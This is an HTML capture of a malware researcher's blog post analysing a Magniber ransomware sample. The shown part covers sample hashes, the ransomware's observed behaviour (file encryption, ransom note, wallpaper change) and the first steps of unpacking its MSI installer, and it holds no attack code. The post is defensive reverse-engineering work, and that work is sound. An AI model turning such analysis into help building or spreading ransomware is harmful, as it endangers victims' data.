var actionbardata = {"siteID":"35018075","postID":"8749","siteURL":"http:\/\/hshrzd.wordpress.com","xhrURL":"https:\/\/hshrzd.wordpress.com\/wp-admin\/admin-ajax.php","nonce":"c432faa6c1","isLoggedIn":"","statusMessage":"","subsEmailDefault":"instantly","proxyScriptUrl":"https:\/\/s0.wp.com\/wp-content\/js\/wpcom-proxy-request.js?ver=20211021","shortlink":"https:\/\/wp.me\/p2mVNF-2h7","i18n":{"followedText":"New posts from this site will now appear in your <a href=\"https:\/\/wordpress.com\/read\">Reader<\/a>","foldBar":"Collapse this bar","unfoldBar":"Expand this bar"}};
/* ]]> */
</script>
<script type="text/javascript" id="jetpack-mu-wpcom-settings-js-before">
/* <![CDATA[ */
var JETPACK_MU_WPCOM_SETTINGS = {"assetsUrl":"https:\/\/s1.wp.com\/wp-content\/mu-plugins\/jetpack-mu-wpcom-plugin\/moon\/vendor\/automattic\/jetpack-mu-wpcom\/src\/build\/"};
/* ]]> */
</script>
<script crossorigin='anonymous' type='text/javascript'  src='https://s2.wp.com/_static/??/wp-content/mu-plugins/jetpack-plugin/moon/_inc/build/related-posts/related-posts.min.js,/wp-content/js/rlt-proxy.js?m=1733762913j'></script>
<script type="text/javascript" id="rlt-proxy-js-after">
/* <![CDATA[ */
	rltInitialize( {"token":null,"iframeOrigins":["https:\/\/widgets.wp.com"]} );
/* ]]> */
</script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://hshrzd.wordpress.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress.com" />
<link rel="canonical" href="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/" />
<link rel='shortlink' href='https://wp.me/p2mVNF-2h7' />
<link rel="alternate" type="application/json+oembed" href="https://public-api.wordpress.com/oembed/?format=json&amp;url=https%3A%2F%2Fhshrzd.wordpress.com%2F2023%2F03%2F30%2Fmagniber-ransomware-analysis%2F&amp;for=wpcom-auto-discovery" /><link rel="alternate" type="application/xml+oembed" href="https://public-api.wordpress.com/oembed/?format=xml&amp;url=https%3A%2F%2Fhshrzd.wordpress.com%2F2023%2F03%2F30%2Fmagniber-ransomware-analysis%2F&amp;for=wpcom-auto-discovery" />
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Magniber ransomware analysis: Tiny Tracer in action" />
<meta property="og:url" content="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/" />
<meta property="og:description" content="Intro Magniber is a ransomware that was initially targeting South Korea. My first report on this malware was written for Malwarebytes in 2017 (here). Since then, the ransomware was completely rewri…" />
<meta property="article:published_time" content="2023-03-30T19:39:28+00:00" />
<meta property="article:modified_time" content="2023-05-19T15:26:19+00:00" />
<meta property="og:site_name" content="hasherezade&#039;s 1001 nights" />
<meta property="og:image" content="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1.bmp.png" />
<meta property="og:image:width" content="219" />
<meta property="og:image:height" content="219" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta property="fb:app_id" content="249643311490" />
<meta property="article:publisher" content="https://www.facebook.com/WordPresscom" />
<meta name="twitter:creator" content="@hasherezade" />
<meta name="twitter:site" content="@hasherezade" />
<meta name="twitter:text:title" content="Magniber ransomware analysis: Tiny Tracer in&nbsp;action" />
<meta name="twitter:image" content="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/locked_example-1.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="shortcut icon" type="image/x-icon" href="https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=32" sizes="16x16" />
<link rel="icon" type="image/x-icon" href="https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=32" sizes="16x16" />
<link rel="apple-touch-icon" href="https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=114" />
<link rel='openid.server' href='https://hshrzd.wordpress.com/?openidserver=1' />
<link rel='openid.delegate' href='https://hshrzd.wordpress.com/' />
<link rel="search" type="application/opensearchdescription+xml" href="https://hshrzd.wordpress.com/osd.xml" title="hasherezade&#039;s 1001 nights" />
<link rel="search" type="application/opensearchdescription+xml" href="https://s1.wp.com/opensearch.xml" title="WordPress.com" />
<meta name="theme-color" content="#d8dbe2" />
		<style type="text/css">
			.recentcomments a {
				display: inline !important;
				padding: 0 !important;
				margin: 0 !important;
			}

			table.recentcommentsavatartop img.avatar, table.recentcommentsavatarend img.avatar {
				border: 0px;
				margin: 0;
			}

			table.recentcommentsavatartop a, table.recentcommentsavatarend a {
				border: 0px !important;
				background-color: transparent !important;
			}

			td.recentcommentsavatarend, td.recentcommentsavatartop {
				padding: 0px 0px 1px 0px;
				margin: 0px;
			}

			td.recentcommentstextend {
				border: none !important;
				padding: 0px 0px 2px 10px;
			}

			.rtl td.recentcommentstextend {
				padding: 0px 10px 2px 0px;
			}

			td.recentcommentstexttop {
				border: none;
				padding: 0px 0px 0px 10px;
			}

			.rtl td.recentcommentstexttop {
				padding: 0px 10px 0px 0px;
			}
		</style>
		<meta name="application-name" content="hasherezade&#039;s 1001 nights" /><meta name="msapplication-window" content="width=device-width;height=device-height" /><meta name="msapplication-tooltip" content="projects and tasks that I do in my free time" /><meta name="description" content="Intro Magniber is a ransomware that was initially targeting South Korea. My first report on this malware was written for Malwarebytes in 2017 (here). Since then, the ransomware was completely rewritten, and turned into a much more complex beast. The articles showing the timeline of the evolution of Magniber ransomware are available here: Magniber at&hellip;" />
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #d8dbe2; }
</style>
	<style type="text/css" id="custom-colors-css">#access ul li.current_page_item > a, #access ul li.current_page_parent > a, #access ul li.current-menu-ancestor > a, #access ul li.current-menu-item > a, #access ul li.current-menu-parent > a { color: #FFFFFF;}
#access li:hover > a, #access ul ul *:hover > a { fg2: #ffffff;}
#access a { color: #AAAAAA;}
.entry-meta a:link, .entry-utility a:link { color: #888888;}
body { background-color: #d8dbe2;}
#access, #access ul ul a { background-color: #000000;}
#access li:hover > a, #access ul ul *:hover > a { background-color: #333333;}
a:link, a:visited, .jetpack_widget_social_icons a:visited, .widget_wpcom_social_media_icons_widget a:visited { color: #0066CC;}
.home .sticky { background-color: #0066cc;}
.home .sticky { background-color: rgba( 0, 102, 204, 0.05 );}
.home .sticky .page-link a { background-color: #0066cc;}
.home .sticky .page-link a { background-color: rgba( 0, 102, 204, 0.2 );}
a:hover, a:focus, a:active { color: #D91B02;}
.entry-title a:active, .entry-title a:hover { color: #D91B02;}
.page-title a:active, .page-title a:hover { color: #D91B02;}
.entry-meta a:hover, .entry-utility a:hover { color: #D91B02;}
.navigation a:active, .navigation a:hover { color: #D91B02;}
.comment-meta a:active, .comment-meta a:hover { color: #D91B02;}
.reply a:hover, a.comment-edit-link:hover { color: #D91B02;}
.page-link a:active, .page-link a:hover { color: #D91B02;}
</style>
</head>

<body class="post-template-default single single-post postid-8749 single-format-standard custom-background customizer-styles-applied single-author jetpack-reblog-enabled custom-colors">
<div id="wrapper" class="hfeed">
	<div id="header">
		<div id="masthead">
			<div id="branding" role="banner">
								<div id="site-title">
					<span>
						<a href="https://hshrzd.wordpress.com/" title="hasherezade&#039;s 1001 nights" rel="home">hasherezade&#039;s 1001 nights</a>
					</span>
				</div>
				<div id="site-description">projects and tasks that I do in my free time</div>

									<a class="home-link" href="https://hshrzd.wordpress.com/" title="hasherezade&#039;s 1001 nights" rel="home">
						<img src="https://hshrzd.wordpress.com/wp-content/uploads/2013/12/cropped-sky31.jpg" width="940" height="198" alt="" />
					</a>
								</div><!-- #branding -->

			<div id="access" role="navigation">
								<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>
				<div class="menu-header"><ul id="menu-home" class="menu"><li id="menu-item-5738" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-5738"><a href="https://hshrzd.wordpress.com">Home</a></li>
<li id="menu-item-162" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-162"><a href="https://hshrzd.wordpress.com/mycode/">Projects</a>
<ul class="sub-menu">
	<li id="menu-item-5140" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5140"><a href="https://hshrzd.wordpress.com/pe-sieve/">PE-sieve</a></li>
	<li id="menu-item-4236" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4236"><a href="https://hshrzd.wordpress.com/pe_unmapper/">PE_unmapper</a></li>
	<li id="menu-item-4234" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4234"><a href="https://hshrzd.wordpress.com/iat-patcher/">IAT Patcher</a></li>
	<li id="menu-item-728" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-728"><a href="https://hshrzd.wordpress.com/pe-bear/">PE-bear</a></li>
	<li id="menu-item-1448" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1448"><a href="https://hshrzd.wordpress.com/vidi-visual-disassembler/">ViDi</a></li>
	<li id="menu-item-1601" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1601"><a href="https://hshrzd.wordpress.com/mycode/dma-unlocker/">DMA Unlocker</a></li>
</ul>
</li>
<li id="menu-item-5674" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5674"><a href="https://hshrzd.wordpress.com/how-to-start/">How to start RE/malware analysis?</a></li>
</ul></div>			</div><!-- #access -->
		</div><!-- #masthead -->
	</div><!-- #header -->

	<div id="main">

		<div id="container">
			<div id="content" role="main">

			

				<div id="nav-above" class="navigation">
					<div class="nav-previous"><a href="https://hshrzd.wordpress.com/2022/11/12/flare-on-9-task-8/" rel="prev"><span class="meta-nav">&larr;</span> Flare-On 9 – Task&nbsp;8</a></div>
					<div class="nav-next"><a href="https://hshrzd.wordpress.com/2024/10/27/flare-on-11-task-10/" rel="next">Flare-On 11 &#8211; Task&nbsp;10 <span class="meta-nav">&rarr;</span></a></div>
				</div><!-- #nav-above -->

				<div id="post-8749" class="post-8749 post type-post status-publish format-standard hentry category-malware category-tutorial tag-ransomware tag-tinytracer">
											<h2 class="entry-title"><a href="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/" rel="bookmark">Magniber ransomware analysis: Tiny Tracer in&nbsp;action</a></h2>					
					<div class="entry-meta">
						<span class="meta-prep meta-prep-author">Posted on</span> <a href="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/" title="9:39 pm" rel="bookmark"><span class="entry-date">March 30, 2023</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="https://hshrzd.wordpress.com/author/hshrzd/" title="View all posts by hasherezade">hasherezade</a></span>					</div><!-- .entry-meta -->

					<div class="entry-content">
						
<h2 class="wp-block-heading">Intro</h2>



<p>Magniber is a ransomware that was initially targeting South Korea. My first report on this malware was written for Malwarebytes in 2017 (<a rel="noreferrer noopener" href="https://www.malwarebytes.com/blog/news/2017/10/magniber-ransomware-exclusively-for-south-koreans" target="_blank">here</a>).</p>



<p>Since then, the ransomware was completely rewritten, and turned into a much more complex beast. The articles showing the timeline of the evolution of Magniber ransomware are available here: <a rel="noreferrer noopener" href="https://malpedia.caad.fkie.fraunhofer.de/details/win.magniber" target="_blank">Magniber at Malpedia</a>. In this writeup we will have a deep dive in a one of the samples from the updated edition.</p>



<p><strong>Note that the sample described here is not new</strong>: it has been discovered in 2022 and analyzed by various researchers. Due to the fact that this malware uses raw syscalls, I decided that it is a good example to showcase <a rel="noreferrer noopener" href="https://github.com/hasherezade/tiny_tracer/releases" target="_blank">the new version of Tiny Tracer (v2.3)</a>, allowing to trace syscalls. However, this writeup is not limited to a short demo, but shows the analysis process step by step, from the beginning. Tiny Tracer will help us easily reach the hidden core of this obfuscated ransomware: the code directly responsible for the files encryption process.</p>



<hr class="wp-block-separator has-alpha-channel-opacity" />



<h2 class="wp-block-heading">Analyzed sample</h2>



<ol class="wp-block-list">
<li><a href="https://www.virustotal.com/gui/file/74e922ff426dc1146188fe48db8410ff720d2a2e8641af902a6891539ced6077/detection">7bb15a442a5aed5b2fa47eef3bc292e9</a> – Original sample: the MSI installer</li>



<li><a rel="noreferrer noopener" href="https://www.virustotal.com/gui/file/ba28c3d409daa2e3685673fe2dde9d8c93aec2b35c478fd66d4c407deceec63c" target="_blank">796eb864005f3393c3adce70dc31d6ba</a> – the Magniber DLL</li>



<li><a href="https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection" target="_blank" rel="noreferrer noopener">882a21d7c07b3997d87e970f30110243</a> &#8211; the Magniber&#8217;s injector (shellcode#1)</li>



<li><a rel="noreferrer noopener" href="https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection" target="_blank">a841c3bf69df48f7b796752d7c86bc38</a> &#8211; the Magniber&#8217;s core (shellcode#2)</li>
</ol>



<h2 class="wp-block-heading">Behavioral analysis</h2>



<p>When executed, this rasomware runs silently, encrypting files with selected extensions, and appending its own extension at the end. In case of the currently analyzed sample, the added extention is &#8216;<code>vieijibfm</code>&#8216;. In each directory with encrypted files, we can also find a ransom note: <code>README.html</code>.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="9153" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/locked_example-1/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/locked_example-1.png" data-orig-size="308,168" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="locked_example-1" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/locked_example-1.png?w=308" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/locked_example-1.png?w=308" width="308" height="168" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/locked_example-1.png?w=308" alt="" class="wp-image-9153" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/locked_example-1.png 308w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/locked_example-1.png?w=150 150w" sizes="(max-width: 308px) 100vw, 308px" /></figure>



<p>Visualization of an encrypted BMP file &#8211; before and after (created with the help of <a rel="noreferrer noopener" href="https://github.com/hasherezade/crypto_utils/blob/master/file2png.py" target="_blank">file2png.py</a>):</p>


<div class="wp-block-image">
<figure class="aligncenter size-large"><img data-attachment-id="8965" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/enc_square1-bmp-2/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1.bmp.png" data-orig-size="219,219" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="enc_square1.bmp" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1.bmp.png?w=219" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1.bmp.png?w=219" width="219" height="219" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1.bmp.png?w=219" alt="" class="wp-image-8965" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1.bmp.png 219w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1.bmp.png?w=150 150w" sizes="(max-width: 219px) 100vw, 219px" /><figcaption class="wp-element-caption">Before the encryption</figcaption></figure></div>

<div class="wp-block-image">
<figure class="aligncenter size-large"><img data-attachment-id="8967" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/enc_square1-another-copy-bmp-vieijibfm/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1-another-copy.bmp.vieijibfm.png" data-orig-size="219,219" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="enc_square1-another-copy.bmp.vieijibfm" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1-another-copy.bmp.vieijibfm.png?w=219" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1-another-copy.bmp.vieijibfm.png?w=219" width="219" height="219" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1-another-copy.bmp.vieijibfm.png?w=219" alt="" class="wp-image-8967" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1-another-copy.bmp.vieijibfm.png 219w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1-another-copy.bmp.vieijibfm.png?w=150 150w" sizes="(max-width: 219px) 100vw, 219px" /><figcaption class="wp-element-caption">After the encryption by Magniber</figcaption></figure></div>


<p>The entropy of the encrypted file is high, and there are no patterns visible. This may suggest that some strong encryption was used, possibly AES with block chaining (CBC mode).</p>



<p>It drops, runs and then deletes a VBS script in <code>C:\Users\Public</code> , under a random name:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="8987" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/dropped/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped.png" data-orig-size="619,310" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dropped" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped.png?w=619" loading="lazy" width="619" height="310" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped.png" alt="" class="wp-image-8987" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped.png 619w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped.png?w=150&amp;h=75 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped.png?w=400&amp;h=200 400w" sizes="(max-width: 619px) 100vw, 619px" /></figure>



<p>We can also find there two files with pseudorandom names, that are used as mutexes, to indidate that the encryption is running, or completed. At the end, the PNG file is dropped in the same directory:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="9155" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/dropped_png/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped_png.png" data-orig-size="628,533" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dropped_png" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped_png.png?w=353" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped_png.png?w=628" loading="lazy" width="628" height="533" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped_png.png" alt="" class="wp-image-9155" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped_png.png 628w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped_png.png?w=150&amp;h=127 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped_png.png?w=353&amp;h=300 353w" sizes="(max-width: 628px) 100vw, 628px" /></figure>



<p>After a while, the wallpaper gets changed to the dropped PNG, announcing the attack:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="8778" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/encrypted/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/encrypted.png" data-orig-size="1655,964" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="encrypted" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/encrypted.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/encrypted.png?w=640" loading="lazy" width="1024" height="596" src="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/encrypted.png?w=1024" alt="" class="wp-image-8778" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/encrypted.png?w=1024 1024w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/encrypted.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/encrypted.png?w=400 400w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/encrypted.png?w=768 768w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/encrypted.png 1655w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>



<p>The information printed at the wallpaper mentions the ransom note <code>README.html</code> where the victim can find more information.</p>



<p>The content of the <code>README.html</code> has the following form:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="9161" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/ransom_note-1-1/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1-1.png" data-orig-size="794,653" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ransom_note-1-1" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1-1.png?w=365" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1-1.png?w=640" loading="lazy" width="794" height="653" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1-1.png" alt="" class="wp-image-9161" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1-1.png 794w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1-1.png?w=150&amp;h=123 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1-1.png?w=365&amp;h=300 365w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1-1.png?w=768&amp;h=632 768w" sizes="(max-width: 794px) 100vw, 794px" /></figure>



<p>It mentions further a Tor website, that can be used to make the contact with the attacker, and possibly buy the key for files decryption. At the time of this analysis, the website was not available.</p>



<p>While the extension added to the encrypted files didn&#8217;t change, and also occurs in the note, the used number at the beginning of the address is generated per attack.</p>



<p>Note that the ransom note is almost identical as the note used by the old Magniber&#8217;s version from 2017:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="9010" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/ransom_note-1/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1.png" data-orig-size="830,492" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ransom_note-1" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1.png?w=640" loading="lazy" width="830" height="492" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1.png" alt="" class="wp-image-9010" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1.png 830w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1.png?w=150&amp;h=89 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1.png?w=400&amp;h=237 400w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1.png?w=768&amp;h=455 768w" sizes="(max-width: 830px) 100vw, 830px" /></figure>



<p><em>Above: ransom note from the old Magniber&#8217;s edition (from 2017), full analysis at: <a href="https://www.malwarebytes.com/blog/news/2017/10/magniber-ransomware-exclusively-for-south-koreans" rel="nofollow">https://www.malwarebytes.com/blog/news/2017/10/magniber-ransomware-exclusively-for-south-koreans</a></em></p>



<h2 class="wp-block-heading">Inside</h2>



<h3 class="wp-block-heading">Upacking the MSI</h3>



<p>Magniber sample comes packed in the MSI (Microsoft Installer). We can view the scripts inside with Microsoft&#8217;s tool, Orca MSI (mirror: <a rel="noreferrer noopener" href="https://www.technipages.com/download-orca-msi-editor" target="_blank">here</a>).</p>



<figure class="wp-block-image size-large"><img data-attachment-id="8751" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/msi_pic/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/msi_pic.png" data-orig-size="612,268" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="msi_pic" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/msi_pic.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/msi_pic.png?w=612" loading="lazy" width="612" height="268" src="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/msi_pic.png?w=612" alt="" class="wp-image-8751" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/msi_pic.png 612w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/msi_pic.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/msi_pic.png?w=400 400w" sizes="(max-width: 612px) 100vw, 612px" /></figure>



<p>By looking at the &#8220;Custom Action&#8221; we find out that the binary to be run is named &#8220;utskzc&#8221;, and the function that will be executed from there is &#8220;mvrtubhpxy&#8221;. In order to access that binary we need to unpack the content of the MSI package. We can do it with the help of 7zip.</p>



<p>Then we find out that the aforementioned binary is a PE file, and it exports the function &#8220;mvrtubhpxy&#8221;.</p>



